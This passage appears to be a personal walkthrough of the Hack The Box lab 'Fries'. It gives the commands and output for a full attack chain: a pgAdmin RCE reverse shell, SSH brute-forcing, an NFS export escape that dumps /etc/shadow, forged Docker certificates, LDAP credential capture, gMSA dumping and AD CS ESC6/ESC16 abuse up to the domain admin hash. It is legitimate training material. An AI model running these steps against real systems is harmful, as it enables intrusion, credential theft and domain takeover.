- leads me to a PoC for a CVE: https://github.com/abrewer251/CVE-2025-2945_PgAdmin_PoC](https://github.com/ExtremeUday/CVE-2025-2945-pgAdmin4-Authenticated-RCE-PoC-/blob/main/poc.py)

- Using this exploit I get a reverse shell on my lsitener:

```
python3 exp3.py --target-url http://db-mgmt05.fries.htb --username 'd.cooper@fries.htb' --password 'D4LE11maan!!' --db-user root --db-pass 'PsqLR00tpaSS11' --db-name 'ps_db' --Rhost 10.10.17.206 --Rport 9999
[+] pgAdmin4 version 9.1 is affected
[+] Successfully authenticated to pgAdmin
[+] Found valid server ID: 1
[*] Initializing SQL editor with trans_id: 1994448
[+] Successfully initialized sqleditor
[+] Sending payload...


```

![[Pasted image 20260403051331.png]]

- Checking `env` varibales I find some credentials:
![[Pasted image 20260403051446.png]]

```
env

---OUTPUT---
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CORRUPTED_DB_BACKUP_FILE=
PGAPPNAME=pgAdmin 4 - CONN:852301
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
SHLVL=3
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/home
```
- I use hydra to find a valid user:`svc`

```
hydra -L /usr/share/wordlists/dirb/common.txt -p 'Friesf00Ds2025!!' ssh://10.129.244.72:22 -t 60

---OUTPUT---
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-03 05:25:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 4614 login tries (l:4614/p:1), ~77 tries per task
[DATA] attacking ssh://10.129.244.72:22/
[STATUS] 395.00 tries/min, 395 tries in 00:01h, 4262 to do in 00:11h, 17 active
[STATUS] 339.67 tries/min, 1019 tries in 00:03h, 3641 to do in 00:11h, 14 active
[STATUS] 282.29 tries/min, 1976 tries in 00:07h, 2684 to do in 00:10h, 14 active
[STATUS] 253.67 tries/min, 3044 tries in 00:12h, 1618 to do in 00:07h, 12 active
[22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session
```
![[Pasted image 20260403055643.png]]
- I login to target with the credentials `svc`:`Friesf00Ds2025!!`
```
ssh svc@fries.htb
> Friesf00Ds2025!!
```
- Looking at showmount I see an IP which points to `/srv/web.fries.htb`
	- Linpeas also showed multiple open ports
```
svc@web:~$ showmount
Hosts on web:
192.168.100.2


svc@web:~$ showmount -e 192.168.100.2
Export list for 192.168.100.2:
/srv/web.fries.htb *
```

- I check the path to find some files:
![[Pasted image 20260403054237.png]]

- As a lot of ports are open internally I use a ligolo tunnel to them be able to analyse the nfs share
```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000
```

- Target machine setup:
```
./agent -connect 10.10.17.206:9000 -ignore-cert
```

- I use a new tool:
https://github.com/hvs-consulting/nfs-security-tooling

```
nfs_analyze 240.0.0.1

--OUTPUT--
Checking host 240.0.0.1
Supported protocol versions reported by portmap:
Protocol          Versions  
portmap           2, 3, 4   
mountd            1, 2, 3   
status monitor 2  1         
nfs               3, 4      
nfs acl           3         
nfs lock manager  1, 3, 4   

Available Exports reported by mountd:
Directory           Allowed clients  Auth methods  Export file handle                                        
/srv/web.fries.htb  *(wildcard)      sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  

Connected clients reported by mountd:
Client             Export              
127.0.0.1(up)      /srv/web.fries.htb  
192.168.100.2(up)  /srv/web.fries.htb  

Supported NFS versions reported by nfsd:
Version  Supported  
3        Yes        
4.0      Yes        
4.1      Yes        
4.2      Yes        

NFSv3 Windows File Handle Signing: OK, server probably not Windows, File Handle not 32 bytes long

Trying to escape exports
Export: /srv/web.fries.htb: file system type ext/xfs, parent: None, 655363
Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found media tmp dev var .bash_history .. swap.img srv home libx32 bin root usr . sbin lib32 opt boot run
Root file handle: 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000

GID of shadow group: 42
Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB20J4yPWwAJxndkOA4zzrn5/Udv4BF9LbLq/:20239:0:99999:7:::
daemon:*:19579:0:99999:7:::                                                                                                                                                                                                                                   
bin:*:19579:0:99999:7:::                                                                                                                                                                                                                                      
sys:*:19579:0:99999:7:::                                                                                                                                                                                                                                      
sync:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
games:*:19579:0:99999:7:::                                                                                                                                                                                                                                    
man:*:19579:0:99999:7:::                                                                                                                                                                                                                                      
lp:*:19579:0:99999:7:::                                                                                                                                                                                                                                       
mail:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
news:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
uucp:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
proxy:*:19579:0:99999:7:::                                                                                                                                                                                                                                    
www-data:*:19579:0:99999:7:::                                                                                                                                                                                                                                 
backup:*:19579:0:99999:7:::                                                                                                                                                                                                                                   
list:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
irc:*:19579:0:99999:7:::                                                                                                                                                                                                                                      
gnats:*:19579:0:99999:7:::                                                                                                                                                                                                                                    
nobody:*:19579:0:99999:7:::                                                                                                                                                                                                                                   
_apt:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
systemd-network:*:19579:0:99999:7:::                                                                                                                                                                                                                          
systemd-resolve:*:19579:0:99999:7:::                                                                                                                                                                                                                          
messagebus:*:19579:0:99999:7:::                                                                                                                                                                                                                               
systemd-timesync:*:19579:0:99999:7:::                                                                                                                                                                                                                         
pollinate:*:19579:0:99999:7:::                                                                                                                                                                                                                                
sshd:*:19579:0:99999:7:::                                                                                                                                                                                                                                     
syslog:*:19579:0:99999:7:::                                                                                                                                                                                                                                   
uuidd:*:19579:0:99999:7:::                                                                                                                                                                                                                                    
tcpdump:*:19579:0:99999:7:::                                                                                                                                                                                                                                  
tss:*:19579:0:99999:7:::                                                                                                                                                                                                                                      
landscape:*:19579:0:99999:7:::                                                                                                                                                                                                                                
fwupd-refresh:*:19579:0:99999:7:::                                                                                                                                                                                                                            
usbmux:*:19589:0:99999:7:::                                                                                                                                                                                                                                   
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9V0PZ.BIyZKSGR6WFJWlxIRiqK.JLOB4PD:20238:0:99999:7:::                                                                                                                                                              
lxd:!:19589::::::                                                                                                                                                                                                                                             
_rpc:*:20234:0:99999:7:::                                                                                                                                                                                                                                     
statd:*:20234:0:99999:7:::                                                                                                                                                                                                                                    
dnsmasq:*:20234:0:99999:7:::                                                                                                                                                                                                                                  
barman:*:20236:0:99999:7:::                                                                                                                                                                                                                                   
sssd:*:20238:0:99999:7:::
```

- We get the Root File handle value:
![[Pasted image 20260403064229.png]]

Can now use (new tool) called  `fuse_nfs` : https://github.com/sahlberg/fuse-nfs

```
fuse_nfs /home/kali/Documents/HTB/Active/Fries/docker1 240.0.0.1 --manual-fh "0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000" --fake-uid --allow-write
```
- Make sure you create the folder `docker1` in the path

- Then you can access the path to see the contents:
![[Pasted image 20260403072120.png]]
- I can access `/srv/web.fries.htb/certs` now and find some certificates
![[Pasted image 20260403072710.png]]
- I recognized it was a docker container (if you didnt already know) via checking the interfaces open and it pointing to a lot.
- I access the docker policy file at `/var/lib/authz-broker/policy.json`:
![[Pasted image 20260403072928.png]]
```
cat policy.json

{"name":"policy_1", "users": ["svc"], "actions": ["container_list", "container_logs"]}
{"name":"policy_1", "users": ["sysadm"], "actions": ["container"], "readonly":true}
{"name":"policy_2", "users": ["root"], "actions": [""]}
```
- Root has full control over the certs: and we have the Docker HTTPS API certificate Root-CA with us as well as client certificate key. Now we need Root CA to re-sign a root client certificate witha  commonly used name 

- First I create the required keys :
```
openssl req -subj "/CN=root" -sha256 -new -key server-key.pem -out server_root.csr

openssl x509 -req -days 365 -sha256 -in server_root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out server-cert_root.pem -extfile server-openssl.cnf
```
- (did this in the cert directory...)
- Then on svc session I create `.docker` folder and get the requried files:
```
cd ~
mkdir .docker
cd .docker
wget http://10.10.17.206/ca.pem
wget http://10.10.17.206/server-cert_root.pem -O cert.pem
wget http://10.10.17.206/server-key.pem -O key.pem
```

- Now I can use these certs to see the containers:
```
docker -H tcp://127.0.0.1:2376 --tls ps

---OUTPUT--
ONTAINER ID   IMAGE                   COMMAND                  CREATED         STATUS       PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        10 months ago   Up 4 hours   0.0.0.0:8443->8443/tcp, [::]:8443->8443/tcp                                  pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         10 months ago   Up 4 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   10 months ago   Up 4 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   10 months ago   Up 4 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   10 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

- Since PWM was not accessible I access that container:
```
docker -H tcp://127.0.0.1:2376 --tls exec -it f427ecaa3bdd /bin/bash
root@f427ecaa3bdd:/#
```

- From here I notice a config folder in / directory. I access it to find the PWM config file `PwmConfiguration.xml` where I find a hash:
![[Pasted image 20260403080944.png]]
- I crack it with john to get the password `rockon!`
```
john hash --wordlist=/usr/share/wordlist/rockyou.txt

---OUTPUT---
rockon!          (?)    
```
![[Pasted image 20260403081103.png]]

- I can then logon to Configuration Editor on the PWM site. Here I find the link to LDAP and see that I can modify it. I turn on a listener and wirehsark and then enter my IP in the LDAP url:
```
rlwrap nc -l -p 389 -s 10.10.17.206(my ip)

wireshark
```

- I change the LDAP Url:
![[Pasted image 20260403081322.png]]

- Then find the credential on wireshark (the netcat output isnt fully readable so fails)
![[Pasted image 20260403081342.png]]

![[Pasted image 20260403081354.png]]

- This might be `svc_infra`'s creds as it was failing to authenticate earlier when we tried to log in to the site:
![[Pasted image 20260403081819.png]]

- However n o log in from winrm or rdp.
### BloodHund:
- I use bloodhound to gather more data
```
bloodhound-python -c all -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns 10.129.244.72 -d  FRIES.HTB --zip
```

- Looking at `svc_infra` I see we can read GSMA pwd for  GSMA_CA_PROD
![[Pasted image 20260403082617.png]]


- Using this tool I can read the password: https://github.com/micahvandeusen/gMSADumper
```
python3 gMSADumper.py -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -d 'fries.htb' 

---OUTPUT---
Users or groups who can read password for gMSA_CA_prod$:
 > svc_infra
gMSA_CA_prod$:::27e126bdd4ae61c18377c4f8dd42fa86
gMSA_CA_prod$:aes256-cts-hmac-sha1-96:dccaa90c8037f51ef15fa579e9c00a2ee0d7c2e705bb74143b0e20da34c1cfcf
gMSA_CA_prod$:aes128-cts-hmac-sha1-96:d88dc2e73b25c44dfd37e32ad86dd12d
```
- Alternatively can jsut use `nxc`:
```
faketime "+7hours" nxc ldap -d fries.htb -u svc_infra -p "m6tneOMAh5p0wQ0d" -k --gmsa dc01.fries.htb

---OUTPUT---
LDAP        dc01.fries.htb  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)                                                                                        
LDAP        dc01.fries.htb  389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
LDAP        dc01.fries.htb  389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.fries.htb  389    DC01             Account: gMSA_CA_prod$        NTLM: 27e126bdd4ae61c18377c4f8dd42fa86
```

- Looking at the gmsa suer we see it is part of remote management users and so we can winrm to the machine:
![[Pasted image 20260403083313.png]]

```
evil-winrm -i dc01.fries.htb -u 'GMSA_CA_PROD$' -H '27e126bdd4ae61c18377c4f8dd42fa86'
```
![[Pasted image 20260403084457.png]]

- Using `Certify` we find CA vulenrabilities : https://github.com/GhostPack/Certify (compiled in visual studio and Debug folder sent to target)
```
.\Certify.exe enum-cas --hide-admins --filter-vulnerable


---RELEVANT-OUTPUT---
CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544

      Access Rights                                     Principal
      Deny   ManageCertificates                         FRIES\Domain Users                 S-1-5-21-858338346-3861030516-3975240472-513
      Deny   ManageCertificates                         FRIES\Domain Computers             S-1-5-21-858338346-3861030516-3975240472-515
      Deny   ManageCertificates                         FRIES\gMSA_CA_prod$                S-1-5-21-858338346-3861030516-3975240472-1104
      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
      Allow  Enroll                                     FRIES\Domain Users                 S-1-5-21-858338346-3861030516-3975240472-513
      Allow  Enroll                                     FRIES\Domain Computers             S-1-5-21-858338346-3861030516-3975240472-515
      Allow  ManageCA, Enroll                           FRIES\gMSA_CA_prod$                S-1-5-21-858338346-3861030516-3975240472-1104
    Enrollment Agent Restrictions : None
    
    
    Enabled Certificate Templates:
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator
```

- We see our user has ManagedCA permissions. If we can give our current user Certificate Officer permissions it will allows it to arbitrarily change the certificate authority `fries-DC01-CA` settings.
- Alos, the current user has enroll permissions for the user certificate and the certificate te plate User is active.
- Given that we have now gained control of the domain certificate authority, we escalate privileges by combining a parameter that is enabled (which allows certificate request to specify any CA name) with a security plugin disabled i.e by exploiting a combination of vulnerbailities : `EDITF_ATTRIBUTESUBJECTALTNAME2`, `SAN`, `szOID_NTDS_CA_SECURITY_EXT ADCS`, `ESC6`,`ESC16`
- Use certipy-ad to grant permission to the current user `ca <amaheCA`, `Certificate Officer`
```
certipy-ad ca -u 'gMSA_CA_prod$'@fries.htb -hashes aad3b435b51404eeaad3b435b51404ee:27e126bdd4ae61c18377c4f8dd42fa86 -target dc01.fries.htb -dc-ip 10.129.19.98 -ca fries-DC01-CA -add-officer 'gMSA_CA_prod$' -debug
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.129.19.98'
[+] DC IP: '10.129.19.98'
[+] DC Host: 'FRIES.HTB'
[+] Target IP: None
[+] Remote Name: 'dc01.fries.htb'
[+] Domain: 'FRIES.HTB'
[+] Username: 'GMSA_CA_PROD$'
[+] Trying to resolve 'dc01.fries.htb' at '10.129.19.98'
[+] Authenticating to LDAP server using NTLM authentication
[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
[+] Using LDAP channel binding for NTLM authentication
[+] LDAP NTLM authentication successful
[+] Bound to ldaps://10.129.19.98:636 - ssl
[+] Default path: DC=fries,DC=htb
[+] Configuration path: CN=Configuration,DC=fries,DC=htb
[+] Trying to get DCOM connection for: '10.129.19.98'
[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'

```

- Then with the Certify tool, the functions to specify the certificate name was enaled `SAN`m and the certificate plugin was disabled:
```
./Certify.exe manage-ca --ca FRIES\Fries-DC01-CA --esc6
./Certify.exe manage-ca --ca FRIES\Fries-DC01-CA --esc16

--OUTPUT-1--
  _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
[*] Successfully set the EditFlags configuration on the CA.

[*] Attempting to restart the CA service.
[X] Error restarting the CA service: Cannot open CertSvc service on computer 'FRIES'.

Certify completed in 00:00:00.4216653


---OUTPUT-2---
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
[*] Successfully set the DisableExtensionList configuration on the CA.

[*] Attempting to restart the CA service.
[X] Error restarting the CA service: Cannot open CertSvc service on computer 'FRIES'.

Certify completed in 00:00:00.0448189
```

- We ten stop and start the `certsvc` service:
```
Stop-Service certsvc -Force
Start-Service certsvc
```

- Initially using `gMSA_CA_prod$` I find that it did not have permissions to request `User` certificate template. I then tried the same command with `svc_infra` which worked:
	- Note to get the ISD we know it ends with 500 for Admin and we can use the remaining format by checking `whoami /user` on `sql-infra` terminal:
![[Pasted image 20260403093909.png]]
```
certipy-ad req -u svc_infra@fries.htb -p "m6tneOMAh5p0wQ0d" -target dc01.fries.htb -dc-ip 10.129.19.98 -ca fries-DC01-CA -template User -upn Administrator@fries.htb -sid "S-1-5-21-858338346-3861030516-3975240472-500" -subject "CN=Administrator,CN=Users,DC=fries,DC=htb" -dcom
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 42
[*] Successfully requested certificate
[*] Got certificate with subject: DC=htb,DC=fries,CN=Users,CN=svc_infra
[*] Got certificate with UPN 'Administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
- We get the domain admin certificate. We can now use this to make `NoPAC` a request to retrieve the domain adminsitrator hash:
```
faketime "+7hours" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.19.98 -domain fries.htb -username Administrator
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

- Using this hash I can log into the DC as Administrator:
```
evil-winrm -i dc01.fries.htb -u 'Administrator' -H 'a773cb05d79273299a684a23ede56748'
```
![[Pasted image 20260403093711.png]]

- I grab the root and user flag in Administrtor's Desktop:
![[Pasted image 20260403093749.png]]